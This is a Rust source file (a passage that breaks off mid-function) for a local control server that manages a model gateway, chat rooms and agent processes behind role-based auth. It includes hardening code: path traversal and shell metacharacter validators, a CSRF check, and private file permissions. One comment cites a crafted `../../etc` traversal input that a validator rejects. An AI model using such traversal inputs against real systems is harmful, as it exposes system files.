//! Control-API for the models/gateway service — the read aggregation a dashboard (the CLI today, the
//! future UCC client) consumes: the active shared gateway, the host residency ledger, and the
//! installed model catalog. The symmetric counterpart to `rozum-meeting::client`; the same snapshot is
//! served over the gateway's HTTP surface for the web/UCC target. See
//! `docs/specs/services-and-clients.md`.

use serde::de::DeserializeOwned;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use std::process::{Command, Stdio};

/// Run a tiny always-up HTTP server exposing the control snapshot, independent of any running
/// gateway (it reads the host residency ledger + catalog from disk). `GET /control/status` → the
/// `status()` JSON, with permissive CORS so a web/UCC client on another origin can fetch it. For the
/// Tailscale path-routed case the client fetches it same-origin and CORS is moot.
///
/// Beyond the read snapshot it now also exposes WRITE actions so the UCC can drive agents from a
/// phone: `POST /control/agent/launch|stop`, `/control/gateway/load`, `/control/task`. Every action
/// that loads a model is admission-gated (`rozum gateway switch` runs the residency gate itself), and
/// the launch reports a refusal verdict rather than risking an OOM.
pub async fn serve(port: u16) -> std::io::Result<()> {
    use axum::{response::IntoResponse, routing::{delete, get, post, put}, Router};
    async fn status_route() -> impl IntoResponse {
        ([(axum::http::header::ACCESS_CONTROL_ALLOW_ORIGIN, "*")], axum::Json(status().await))
    }
    ensure_rbac_initialized();
    harden_state_perms();
    if load_users().is_empty() {
        if let Some(token) = ensure_bootstrap_token() {
            eprintln!("control server: no admin registered yet — first-registration bootstrap token: {token}");
            eprintln!("control server: open the login page with ?token={token} appended to register, e.g. https://<host>/login?token={token}");
        }
    }
    // Public: SPA static files + auth ceremony + the deliberately-scoped anonymous view-token routes.
    // NOTE: `/control/status`, `/chat/*`, and the plain `/control/matrix/*` reads used to live here —
    // that was an unauthenticated full-dashboard data leak (workdirs, task prompts, chat transcripts,
    // live session ids). They now require the `read` permission; see the `reads` router below.
    let public = Router::new()
        .route("/", get(spa_root_route))
        .route("/{*path}", get(spa_static_route))
        .route("/control/config", get(config_route))
        .route("/control/auth/status", get(auth_status_route))
        .route("/control/auth/register/begin", post(register_begin_route))
        .route("/control/auth/register/finish", post(register_finish_route))
        .route("/control/auth/login/begin", post(login_begin_route))
        .route("/control/auth/login/finish", post(login_finish_route))
        .route("/control/invite/info", get(invite_info_route))
        .route("/control/public/matrix", get(public_matrix_route))
        .route("/control/public/matrix/live", get(public_matrix_live_route))
        .route("/control/public/matrix/cell", get(public_matrix_cell_route))
        .route("/view/{token}", get(view_token_page_route));
    // Admin sub-router (require_auth + require_admin both applied).
    let admin = Router::new()
        .route("/control/admin/users", get(admin_users_route))
        .route("/control/admin/users/{id}/role", post(admin_set_role_route))
        .route("/control/admin/users/{id}", delete(admin_delete_user_route))
        .route("/control/admin/roles", get(admin_roles_route))
        .route("/control/admin/roles", post(admin_create_role_route))
        .route("/control/admin/roles/{id}", put(admin_update_role_route))
        .route("/control/admin/roles/{id}", delete(admin_delete_role_route))
        .route("/control/admin/invites", get(admin_invites_route))
        .route("/control/admin/invites/create", post(admin_invite_create_route))
        .route("/control/admin/invites/{token}", delete(admin_revoke_invite_route))
        .route("/control/admin/view-tokens", get(admin_view_tokens_route))
        .route("/control/admin/view-tokens/create", post(admin_view_token_create_route))
        .route("/control/admin/view-tokens/{token}", delete(admin_view_token_revoke_route))
        .route_layer(axum::middleware::from_fn(require_admin));
    // Read-only dashboard data — needs the `read` permission (every role has it by default).
    let reads = Router::new()
        .route("/control/status", get(status_route))
        .route("/chat/messages", get(chat_messages_route))
        .route("/chat/incidents", get(chat_incidents_route))
        .route("/control/matrix/status", get(matrix_status_route))
        .route("/control/matrix/log", get(matrix_log_route))
        .route("/control/matrix/cell", get(matrix_cell_route))
        .route("/control/matrix/live", get(matrix_live_route))
        .route("/control/model/info", get(model_info_route))
        .route_layer(axum::middleware::from_fn(require_perm_read));
    let chat = Router::new()
        .route("/chat/post", post(chat_post_route))
        .route_layer(axum::middleware::from_fn(require_perm_chat));
    // Everything that can launch/drive an agent, coder, or interactive shell — gated by `agents`
    // (readonly/no-role users could previously reach these once merely authenticated).
    let agents = Router::new()
        .route("/control/gateway/load", post(gateway_load_route).get(gateway_load_get_route))
        .route("/control/gateway/stop", post(gateway_stop_route).get(gateway_stop_get_route))
        .route("/control/agent/launch", post(agent_launch_route))
        .route("/control/agent/stop", post(agent_stop_route))
        .route("/control/task", post(task_route))
        .route("/control/coder/launch", post(coder_launch_route))
        .route("/control/coder/stop", post(coder_stop_route))
        .route("/control/coder/log", get(coder_log_route))
        .route("/control/session/launch", post(session_launch_route))
        .route("/control/session/stop", post(session_stop_route))
        .route("/control/session/attach/{id}", get(session_attach_route))
        .route_layer(axum::middleware::from_fn(require_perm_agents));
    let matrix = Router::new()
        .route("/control/matrix/run", post(matrix_run_route))
        .route("/control/matrix/pause", post(matrix_pause_route))
        .route("/control/matrix/resume", post(matrix_resume_route))
        .route("/control/matrix/stop", post(matrix_stop_route))
        .route_layer(axum::middleware::from_fn(require_perm_matrix));
    let projects = Router::new()
        .route("/control/project/add", post(project_add_route))
        .route_layer(axum::middleware::from_fn(require_perm_projects));
    // Protected by `require_auth` (own Face ID session OR busi SSO), each sub-router additionally
    // gated on its own permission above.
    let protected = reads.merge(chat).merge(agents).merge(matrix).merge(projects).merge(admin)
        .route_layer(axum::middleware::from_fn(require_auth));
    let app = public.merge(protected);
    let addr = format!("127.0.0.1:{port}");
    let listener = tokio::net::TcpListener::bind(&addr).await?;
    tokio::spawn(matrix_worker());
    eprintln!("control server: http://{addr}/ (SPA + API, no Python proxy needed)");
    axum::serve(listener, app).await
}

// ── Static SPA file serving (replaces ucc-web-server.py) ─────────────────────────────────────────

fn ucc_site_dir() -> PathBuf {
    std::env::var_os("HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from("/tmp"))
        .join(".rozum/ucc/site")
}

fn serve_site_file(name: &str) -> axum::response::Response {
    use axum::{http::{header, HeaderValue, StatusCode}, response::IntoResponse};
    let path = ucc_site_dir().join(name);
    match std::fs::read(&path) {
        Ok(mut bytes) => {
            let ext = path.extension().and_then(|e| e.to_str());
            let mime = match ext {
                Some("html") => "text/html; charset=utf-8",
                Some("js")   => "application/javascript",
                Some("css")  => "text/css",
                Some("svg")  => "image/svg+xml",
                Some("png")  => "image/png",
                Some("ico")  => "image/x-icon",
                Some("webmanifest") => "application/manifest+json",
                _ => "application/octet-stream",
            };
            if ext == Some("html") {
                // Inject service-worker registration before </body> so PWA auto-updates
                // without requiring a manual hard-refresh.
                const SW_REG: &[u8] = b"<script>if('serviceWorker' in navigator){navigator.serviceWorker.register('/sw.js')}</script>";
                if let Some(pos) = std::str::from_utf8(&bytes).ok().and_then(|s| s.rfind("</body>")) {
                    bytes.splice(pos..pos, SW_REG.iter().copied());
                }
            }
            let mut resp = ([(header::CONTENT_TYPE, mime)], bytes).into_response();
            if ext == Some("html") {
                resp.headers_mut().insert(header::CACHE_CONTROL, HeaderValue::from_static("no-store"));
            }
            resp
        }
        Err(_) => StatusCode::NOT_FOUND.into_response(),
    }
}

async fn spa_root_route() -> axum::response::Response {
    serve_site_file("index.html")
}

async fn spa_static_route(
    axum::extract::Path(path): axum::extract::Path<String>,
) -> axum::response::Response {
    use axum::{http::StatusCode, response::IntoResponse};
    // Guard against path traversal; only serve known static extensions.
    if path.contains("..") || path.starts_with('/') {
        return StatusCode::NOT_FOUND.into_response();
    }
    let allowed = matches!(
        std::path::Path::new(&path).extension().and_then(|e| e.to_str()),
        Some("html" | "js" | "css" | "svg" | "png" | "ico" | "webmanifest" | "txt")
    );
    if !allowed {
        return StatusCode::NOT_FOUND.into_response();
    }
    serve_site_file(&path)
}

// ── Chat read/write endpoints (replaces ucc-web-server.py proxy logic) ───────────────────────────

#[derive(serde::Deserialize)]
struct RoomQuery { room: String }

async fn chat_messages_route(
    axum::extract::Query(q): axum::extract::Query<RoomQuery>,
) -> axum::response::Response {
    use axum::{http::StatusCode, response::IntoResponse};
    if !valid_room_name(&q.room) { return StatusCode::BAD_REQUEST.into_response(); }
    axum::Json(read_room_messages(&q.room, 80)).into_response()
}

async fn chat_incidents_route(
    axum::extract::Query(q): axum::extract::Query<RoomQuery>,
) -> axum::response::Response {
    use axum::{http::StatusCode, response::IntoResponse};
    if !valid_room_name(&q.room) { return StatusCode::BAD_REQUEST.into_response(); }
    axum::Json(read_room_incidents(&q.room)).into_response()
}

async fn chat_post_route(
    headers: axum::http::HeaderMap,
    body: axum::body::Bytes,
) -> axum::response::Response {
    use axum::{http::StatusCode, response::IntoResponse};
    let room = headers
        .get("X-Room")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    if !valid_room_name(&room) { return StatusCode::BAD_REQUEST.into_response(); }
    // Proxy to the meeting daemon at :8405/p.
    let client = reqwest::Client::new();
    match client
        .post("http://127.0.0.1:8405/p")
        .header("X-Room", &room)
        .header("Content-Type", "text/plain")
        .body(body.to_vec())
        .send()
        .await
    {
        Ok(r) if r.status().is_success() => StatusCode::OK.into_response(),
        Ok(r) => (StatusCode::BAD_GATEWAY, r.status().as_str().to_string()).into_response(),
        Err(e) => (StatusCode::BAD_GATEWAY, e.to_string()).into_response(),
    }
}

fn valid_room_name(name: &str) -> bool {
    !name.is_empty() && name.len() <= 128 && !name.chars().any(|c| matches!(c, '\r' | '\n' | '\0' | '/'))
}

fn rooms_json_path() -> Option<PathBuf> {
    state_dir().map(|d| d.join("rooms.json"))
}

fn room_root(name: &str) -> Option<PathBuf> {
    let path = rooms_json_path()?;
    let val: serde_json::Value = serde_json::from_slice(&std::fs::read(&path).ok()?).ok()?;
    let rooms = match &val {
        serde_json::Value::Array(a) => a.clone(),
        serde_json::Value::Object(o) => o.get("rooms").and_then(|v| v.as_array()).cloned().unwrap_or_default(),
        _ => return None,
    };
    for r in &rooms {
        if r.get("name").and_then(|v| v.as_str()) == Some(name) {
            return r.get("root").and_then(|v| v.as_str()).map(PathBuf::from);
        }
    }
    None
}

#[derive(serde::Serialize)]
struct ChatMessage { time: String, author: String, content: String }

fn read_room_messages(room: &str, limit: usize) -> Vec<ChatMessage> {
    let Some(root) = room_root(room) else { return vec![]; };
    if !root.is_dir() { return vec![]; }
    let mut files: Vec<_> = std::fs::read_dir(&root)
        .into_iter().flatten().filter_map(|e| e.ok()).map(|e| e.path())
        .filter(|p| p.extension().and_then(|e| e.to_str()) == Some("jsonl"))
        .collect();
    files.sort();
    let mut out = vec![];
    for fp in &files {
        let Ok(text) = std::fs::read_to_string(fp) else { continue; };
        for line in text.lines() {
            let line = line.trim();
            if line.is_empty() { continue; }
            let Ok(m) = serde_json::from_str::<serde_json::Value>(line) else { continue; };
            let Some(content) = m.get("content").and_then(|v| v.as_str()) else { continue; };
            let author = m.get("display_name")
                .or_else(|| m.get("author"))
                .and_then(|v| v.as_str()).unwrap_or("?");
            let ts = m.get("ts").and_then(|v| v.as_u64()).unwrap_or(0);
            let time = { let h = (ts / 3600) % 24; let min = (ts / 60) % 60; format!("{h:02}:{min:02}") };
            out.push(ChatMessage { time, author: author.to_string(), content: content.to_string() });
        }
    }
    if out.len() > limit { out.drain(..out.len() - limit); }
    out
}

#[derive(serde::Serialize)]
struct Incident { severity: String, state: String, title: String, owner: String }

fn read_room_incidents(room: &str) -> Vec<Incident> {
    let Some(root) = room_root(room) else { return vec![]; };
    let Ok(bytes) = std::fs::read(root.join("threads.json")) else { return vec![]; };
    let Ok(serde_json::Value::Array(arr)) = serde_json::from_slice::<serde_json::Value>(&bytes) else { return vec![]; };
    arr.iter().filter_map(|t| {
        Some(Incident {
            title:    t.get("title")?.as_str()?.to_string(),
            state:    t.get("state").and_then(|v| v.as_str()).unwrap_or("open").to_string(),
            severity: t.get("severity").and_then(|v| v.as_str()).unwrap_or("low").to_string(),
            owner:    t.get("owner").and_then(|v| v.as_str()).unwrap_or("").to_string(),
        })
    }).collect()
}

// ── Agent registry + actions (write side of the control API) ─────────────────────────────────────
//
// Chat-agents are `rozum meetings participant` processes. There is no built-in registry, so we keep a
// small JSON file (`<state>/rozum/ucc-agents.json`) the launch/stop maintain, keyed by a generated id,
// and check liveness with `kill(pid, 0)`. Actions exec the `rozum` CLI via the current binary (which IS
// the full gateway CLI) so there is no extra crate dependency, mirroring `list_meetings`' read-only
// disk approach.

/// One launched chat-agent we track. Persisted to the registry; `alive` is computed per status.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentRecord {
    pub id: String,
    pub model: String,
    pub room: String,
    pub handle: String,
    pub policy: String,
    pub pid: u32,
    pub started_at: u64,
}

/// Display brief for a running agent (registry entry + liveness), in `ControlStatus.agents`.
#[derive(Debug, Clone, Serialize)]
pub struct AgentBrief {
    pub id: String,
    pub model: String,
    pub room: String,
    pub handle: String,
    pub policy: String,
    pub pid: u32,
    pub alive: bool,
}

fn state_dir() -> Option<PathBuf> {
    std::env::var_os("XDG_STATE_HOME")
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".local/state")))
        .map(|b| b.join("rozum"))
}

fn agents_registry_path() -> Option<PathBuf> {
    state_dir().map(|d| d.join("ucc-agents.json"))
}

fn load_agents() -> Vec<AgentRecord> {
    agents_registry_path()
        .and_then(|p| std::fs::read(p).ok())
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default()
}

fn save_agents(agents: &[AgentRecord]) {
    if let Some(p) = agents_registry_path() {
        if let Some(dir) = p.parent() {
            let _ = std::fs::create_dir_all(dir);
        }
        if let Ok(body) = serde_json::to_vec_pretty(agents) {
            let tmp = p.with_extension("json.tmp");
            if std::fs::write(&tmp, &body).is_ok() {
                let _ = std::fs::rename(&tmp, &p);
            }
        }
    }
}

/// Is `pid` still alive? `kill(pid, 0)` returns 0 for a live process we can signal.
fn pid_alive(pid: u32) -> bool {
    unsafe { libc::kill(pid as libc::pid_t, 0) == 0 }
}

/// The agents we currently know about, with a fresh liveness check; prunes dead ones from the registry.
fn live_agents() -> Vec<AgentBrief> {
    let all = load_agents();
    let (alive, dead): (Vec<_>, Vec<_>) = all.into_iter().partition(|a| pid_alive(a.pid));
    if !dead.is_empty() {
        save_agents(&alive); // self-heal: drop processes that have exited
    }
    alive
        .into_iter()
        .map(|a| AgentBrief {
            id: a.id, model: a.model, room: a.room, handle: a.handle, policy: a.policy,
            pid: a.pid, alive: true,
        })
        .collect()
}

/// Run a `rozum` subcommand to completion, capturing output. Uses the current binary (the full gateway
/// CLI), so no PATH dependency. Returns (success, combined stdout+stderr).
fn run_rozum(args: &[&str]) -> (bool, String) {
    let exe = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("rozum"));
    match Command::new(&exe).args(args).output() {
        Ok(out) => {
            let mut s = String::from_utf8_lossy(&out.stdout).into_owned();
            s.push_str(&String::from_utf8_lossy(&out.stderr));
            (out.status.success(), s)
        }
        Err(e) => (false, format!("spawn failed: {e}")),
    }
}

/// Ensure the shared gateway serves `model`. Reuses it if already serving; `gateway switch` swaps
/// the resident model in place when a different one is loaded (the switch runs the residency
/// admission gate itself and exits non-zero if it won't fit); when NO gateway is running at all —
/// the cold-start case `gateway switch` refuses — spawn a detached daemon like `rozum launch` does
/// and wait for it to come up. Returns the gateway port on success, or an error message (incl. an
/// admission refusal) on failure.
async fn ensure_gateway(model: &str) -> Result<u16, String> {
    if let Some(g) = crate::share::read_active() {
        if crate::share::health_ok(g.port).await {
            if g.model == model {
                return Ok(g.port);
            }
            let (ok, out) = run_rozum(&["gateway", "switch", "--model", model]);
            if !ok {
                return Err(format!("could not load {model}: {}", out.trim()));
            }
            return crate::share::read_active()
                .map(|g| g.port)
                .ok_or_else(|| "gateway not running after load".into());
        }
        // Stale registry record (gateway died without cleanup): fall through to a fresh
        // start — the new daemon bumps `generation` and overwrites the record.
    }
    cold_start_gateway(model).await
}

/// Spawn a detached `rozum gateway --model … --port <default>` daemon — the same shape
/// `rozum launch`'s spawn_detached_gateway uses — and wait for it to register and answer health.
/// The daemon runs the residency admission gate on startup and exits non-zero on refusal, which
/// surfaces here as the error; model-load progress/errors land in gateway.log.
async fn cold_start_gateway(model: &str) -> Result<u16, String> {
    let exe = std::env::current_exe().map_err(|e| format!("current_exe: {e}"))?;
    let dir = crate::share::gateway_dir();
    let _ = std::fs::create_dir_all(&dir);
    let log_path = dir.join("gateway.log");
    let log = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
        .map_err(|e| format!("open {}: {e}", log_path.display()))?;
    let log2 = log.try_clone().map_err(|e| e.to_string())?;
    let port = crate::share::DEFAULT_GATEWAY_PORT;
    let mut cmd = Command::new(&exe);
    cmd.args(["gateway", "--model", model, "--port", &port.to_string()])
        .stdin(Stdio::null())
        .stdout(Stdio::from(log))
        .stderr(Stdio::from(log2));
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        cmd.process_group(0); // detach from control-serve's group so it survives a service restart
    }
    let mut child = cmd.spawn().map_err(|e| format!("spawn gateway daemon: {e}"))?;
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(300);
    loop {
        if crate::share::health_ok(port).await {
            return crate::share::read_active()
                .map(|g| g.port)
                .ok_or_else(|| "gateway healthy but not registered".into());
        }
        if let Ok(Some(status)) = child.try_wait() {
            return Err(format!(
                "gateway daemon exited before becoming ready ({status}); see {}",
                log_path.display()
            ));
        }
        if std::time::Instant::now() >= deadline {
            return Err(format!(
                "gateway not ready after 300s (still loading/downloading?); see {}",
                log_path.display()
            ));
        }
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    }
}

/// Spawn `rozum meetings participant …` DETACHED (own process group, output → a per-agent log), so it
/// survives a control-serve restart. Returns the child pid.
fn spawn_participant(model: &str, room: &str, policy: &str, persona: &str, gw_port: u16) -> std::io::Result<u32> {
    use std::os::unix::process::CommandExt;
    let exe = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("rozum"));
    let gw_url = format!("http://127.0.0.1:{gw_port}/v1");
    let log_path = state_dir()
        .map(|d| d.join("logs"))
        .unwrap_or_else(|| PathBuf::from("/tmp"));
    let _ = std::fs::create_dir_all(&log_path);
    let log = std::fs::OpenOptions::new()
        .create(true).append(true)
        .open(log_path.join(format!("agent-{}-{}.log", sanitize(room), sanitize(model))))?;
    let log2 = log.try_clone()?;
    let mut cmd = Command::new(&exe);
    cmd.args(["meetings", "participant", "--model", model, "--room", room, "--reply-policy", policy]);
    if !persona.is_empty() {
        cmd.args(["--persona", persona]);
    }
    cmd.args(["--gateway-url", &gw_url]);
    cmd.stdin(Stdio::null()).stdout(Stdio::from(log)).stderr(Stdio::from(log2));
    cmd.process_group(0); // detach from control-serve's group so it survives a service restart
    Ok(cmd.spawn()?.id())
}

fn sanitize(s: &str) -> String {
    s.chars().map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '_' }).collect()
}

/// True if `s` cannot contain shell metacharacters — unlike `sanitize` (which mangles a string into a
/// safe one), this REJECTS instead of mutating, for values that get interpolated into a shell-command
/// string rather than passed as a plain argv element (`session_launch_route`'s tmux `inner` string).
/// Permits the charset real model/agent identifiers use (HF-style `org/repo:tag`, dots, plus signs).
fn shell_safe(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | ':' | '@' | '+'))
}

/// True if `s` is safe to use as a SINGLE filesystem path segment (matrix `stamp`/`agent`/`task` etc.)
/// — non-empty, not `.`/`..`, and containing no path separator or NUL. Rejects rather than mangles, so a
/// crafted `../../etc` walk cannot escape the results dir the segment is joined onto (path-traversal fix).
fn safe_path_seg(s: &str) -> bool {
    !s.is_empty() && s != "." && s != ".." && !s.chars().any(|c| matches!(c, '/' | '\\' | '\0'))
}

/// CSRF guard for state-changing GET routes (the SPA drives gateway load/stop via same-origin `<a>`
/// anchors). Browsers send `Sec-Fetch-Site: same-origin` for the SPA's own links, `none` for a typed
/// URL/bookmark, and `cross-site` for an attacker's cross-site link/redirect — reject only the last so a
/// cross-site navigation can't ride the SameSite=Lax session cookie. Absent header (non-browser) → allow.
fn same_site_get(headers: &axum::http::HeaderMap) -> bool {
    match headers.get("sec-fetch-site").and_then(|v| v.to_str().ok()) {
        Some(s) => matches!(s, "same-origin" | "same-site" | "none"),
        None => true,
    }
}

/// Atomically write `bytes` to `path` (tmp + rename) with 0600 perms so on-disk secrets (session
/// tokens, WebAuthn credentials, RBAC state, view tokens) are not world-readable. Best-effort like the
/// callers it replaces.
fn atomic_write_private(path: &std::path::Path, bytes: &[u8]) {
    if let Some(dir) = path.parent() {
        let _ = std::fs::create_dir_all(dir);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700));
        }
    }
    let tmp = path.with_extension("json.tmp");
    if std::fs::write(&tmp, bytes).is_ok() {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&tmp, std::fs::Permissions::from_mode(0o600));
        }
        let _ = std::fs::rename(&tmp, path);
    }
}

/// On startup, tighten perms on any pre-existing secret files (some may have been written 0644 before
/// this hardening) and the state dir, so a redeploy remediates them without waiting for the next write.
#[cfg(unix)]
fn harden_state_perms() {
    use std::os::unix::fs::PermissionsExt;
    let Some(dir) = state_dir() else { return };
    if dir.exists() { let _ = std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700)); }
    for name in ["ucc-auth-sessions.json", "ucc-credentials.json", "ucc-view-tokens.json",
                 "ucc-users.json", "ucc-roles.json", "ucc-invites.json", "ucc-bootstrap-token.txt"] {
        let p = dir.join(name);
        if p.exists() { let _ = std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o600)); }
    }
}
#[cfg(not(unix))]
fn harden_state_perms() {}

// ── Action route handlers ────────────────────────────────────────────────────────────────────────

#[derive(Deserialize)]
struct GatewayLoadReq { model: String }

async fn gateway_load_route(body: String) -> axum::response::Response {
    use axum::response::IntoResponse;
    // Accept JSON {"model":"..."} (from the chat form) OR plain-text spec (from rowPost table action).
    let model = serde_json::from_str::<GatewayLoadReq>(&body)
        .map(|r| r.model)
        .unwrap_or_else(|_| body.trim().to_string());
    if model.is_empty() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "model required");
    }
    match ensure_gateway(&model).await {
        Ok(port) => axum::Json(serde_json::json!({ "ok": true, "model": model, "port": port })).into_response(),
        Err(e) => json_err(axum::http::StatusCode::CONFLICT, &e),
    }
}

async fn gateway_stop_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    let Some(active) = crate::share::read_active() else {
        return json_err(axum::http::StatusCode::NOT_FOUND, "no shared gateway running");
    };
    let clients = crate::share::live_lease_count(crate::share::LEASE_FRESH_SECS);
    if clients > 0 {
        return json_err(
            axum::http::StatusCode::CONFLICT,
            &format!("{clients} client(s) attached; stop them first"),
        );
    }
    let pid_str = active.pid.to_string();
    let ok = std::process::Command::new("kill").arg(&pid_str).status()
        .map(|s| s.success())
        .unwrap_or(false);
    if ok {
        crate::share::remove_active_if_mine(active.pid);
        axum::Json(serde_json::json!({ "ok": true, "pid": active.pid })).into_response()
    } else {
        json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, &format!("kill {pid_str} failed"))
    }
}

// GET variants for SPA per-row links: load/stop via a plain anchor → redirect back to /.
#[derive(Deserialize)]
struct GatewayLoadQuery { model: String }

async fn gateway_load_get_route(
    headers: axum::http::HeaderMap,
    axum::extract::Query(q): axum::extract::Query<GatewayLoadQuery>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    if !same_site_get(&headers) {
        return json_err(axum::http::StatusCode::FORBIDDEN, "cross-site request refused");
    }
    let model = q.model.trim().to_string();
    if model.is_empty() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "model required");
    }
    let _ = ensure_gateway(&model).await;
    axum::response::Redirect::to("/").into_response()
}

async fn gateway_stop_get_route(headers: axum::http::HeaderMap) -> axum::response::Response {
    use axum::response::IntoResponse;
    if !same_site_get(&headers) {
        return json_err(axum::http::StatusCode::FORBIDDEN, "cross-site request refused");
    }
    if let Some(active) = crate::share::read_active() {
        if crate::share::live_lease_count(crate::share::LEASE_FRESH_SECS) == 0 {
            let pid_str = active.pid.to_string();
            if std::process::Command::new("kill").arg(&pid_str).status()
                .map(|s| s.success()).unwrap_or(false)
            {
                crate::share::remove_active_if_mine(active.pid);
            }
        }
    }
    axum::response::Redirect::to("/").into_response()
}

#[derive(Deserialize)]
struct ModelInfoQuery { spec: String }

async fn model_info_route(
    axum::extract::Query(q): axum::extract::Query<ModelInfoQuery>,
) -> axum::response::Response {
    use axum::response::IntoResponse;
    let spec = q.spec.trim().to_string();
    if spec.is_empty() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "spec required");
    }
    let installed = rozum_models::models::scan_all_installed();
    let Some(model) = installed.iter().find(|m| m.spec == spec) else {
        return json_err(axum::http::StatusCode::NOT_FOUND, "not found");
    };
    let source = spec.splitn(2, ':').next().unwrap_or("local").to_string();
    let name   = spec.splitn(2, ':').nth(1).unwrap_or(&spec).to_string();
    let path   = model.path.to_string_lossy().to_string();
    let gib = |b: u64| format!("{:.2}", b as f64 / 1_073_741_824.0);
    let size_gib = gib(model.size_bytes);

    // Find config.json. For HuggingFace hub models the layout is:
    //   models--owner--name/refs/main   → snapshot hash
    //   models--owner--name/snapshots/<hash>/config.json
    // For flat model dirs (LMStudio, Ollama, local) config.json is directly in path.
    let cfg_path = {
        let refs_main = model.path.join("refs").join("main");
        if let Ok(hash) = std::fs::read_to_string(&refs_main) {
            let p = model.path.join("snapshots").join(hash.trim()).join("config.json");
            if p.exists() { p } else { model.path.join("config.json") }
        } else {
            // Fallback: first snapshot dir
            model.path.join("snapshots").read_dir().ok()
                .and_then(|mut rd| rd.next())
                .and_then(|e| e.ok())
                .map(|e| e.path().join("config.json"))
                .filter(|p| p.exists())
                .unwrap_or_else(|| model.path.join("config.json"))
        }
    };
    let cfg: serde_json::Value = std::fs::read_to_string(&cfg_path)
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or(serde_json::Value::Null);
    let root = cfg.get("text_config").unwrap_or(&cfg);
    let str_field = |v: &serde_json::Value, k: &str| {
        v.get(k).and_then(|x| x.as_u64()).map(|n| n.to_string()).unwrap_or_default()
    };
    let model_type        = root.get("model_type").and_then(|v| v.as_str()).unwrap_or("").to_string();
    let max_ctx           = str_field(root, "max_position_embeddings");
    let num_layers        = str_field(root, "num_hidden_layers");
    let num_attn_heads    = str_field(root, "num_attention_heads");
    let num_kv_heads      = str_field(root, "num_key_value_heads");
    let hidden_size       = str_field(root, "hidden_size");
    let quant_bits        = cfg.get("quantization").or_else(|| cfg.get("quantization_config"))
        .and_then(|q| q.get("bits")).and_then(|b| b.as_u64())
        .map(|b| format!("{b}-bit")).unwrap_or_default();
    let n_experts         = str_field(root, "n_routed_experts");
    let experts_per_tok   = str_field(root, "num_experts_per_tok");

    // Catalog notes/display_name (RECOMMENDED + EXTRA).
    let catalog_entry = rozum_models::models::RECOMMENDED.iter()
        .chain(rozum_models::models::EXTRA.iter())
        .find(|m| m.spec == spec);
    let display_name  = catalog_entry.map(|m| m.display_name).unwrap_or("").to_string();
    let notes         = catalog_entry.map(|m| m.notes).unwrap_or("").to_string();

    let resident = crate::share::read_active().and_then(|a| {
        if a.model == spec {
            Some(serde_json::json!({ "pid": a.pid, "port": a.port }))
        } else { None }
    });
    axum::Json(serde_json::json!({
        "spec":           spec,
        "display_name":   display_name,
        "source":         source,
        "name":           name,
        "size_gib":       size_gib,
        "size_bytes":     model.size_bytes,
        "path":           path,
        "model_type":     model_type,
        "max_ctx":        max_ctx,
        "num_layers":     num_layers,
        "num_attn_heads": num_attn_heads,
        "num_kv_heads":   num_kv_heads,
        "hidden_size":    hidden_size,
        "quant":          quant_bits,
        "n_experts":      n_experts,
        "experts_per_tok":experts_per_tok,
        "notes":          notes,
        "resident":       resident,
    })).into_response()
}

#[derive(Deserialize)]
struct AgentLaunchReq {
    model: String,
    room: String,
    #[serde(default = "default_policy")]
    policy: String,
    #[serde(default)]
    persona: String,
    #[serde(default)]
    handle: String,
}
fn default_policy() -> String { "mention".into() }

async fn agent_launch_route(body: String) -> axum::response::Response {
    use axum::response::IntoResponse;
    let req: AgentLaunchReq = match parse_action_json(&body) {
        Ok(req) => req,
        Err(e) => return json_err(axum::http::StatusCode::BAD_REQUEST, &e),
    };
    let model = req.model.trim().to_string();
    let room = req.room.trim().to_string();
    if model.is_empty() || room.is_empty() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "model and room required");
    }
    // 1) Ensure the gateway serves the model — admission-gated; a refusal returns the verdict.
    let port = match ensure_gateway(&model).await {
        Ok(p) => p,
        Err(e) => {
            let report = footprint_report(&model);
            return (
                axum::http::StatusCode::CONFLICT,
                axum::Json(serde_json::json!({ "ok": false, "error": e, "admission": report })),
            ).into_response();
        }
    };
    // 2) Spawn the participant detached + register it.
    match spawn_participant(&model, &room, &req.policy, req.persona.trim(), port) {
        Ok(pid) => {
            let h = req.handle.trim().to_string();
            let handle = if h.is_empty() { derive_handle(&model) } else { h };
            let id = format!("{}-{}", sanitize(&room), pid);
            let mut agents = load_agents();
            agents.push(AgentRecord {
                id: id.clone(), model: model.clone(), room: room.clone(),
                handle: handle.clone(), policy: req.policy.clone(), pid,
                started_at: crate::share::now_unix(),
            });
            save_agents(&agents);
            axum::Json(serde_json::json!({ "ok": true, "id": id, "handle": handle, "pid": pid })).into_response()
        }
        Err(e) => json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, &format!("spawn: {e}")),
    }
}

async fn agent_stop_route(body: String) -> axum::response::Response {
    use axum::response::IntoResponse;
    let id = match parse_id_body(&body) {
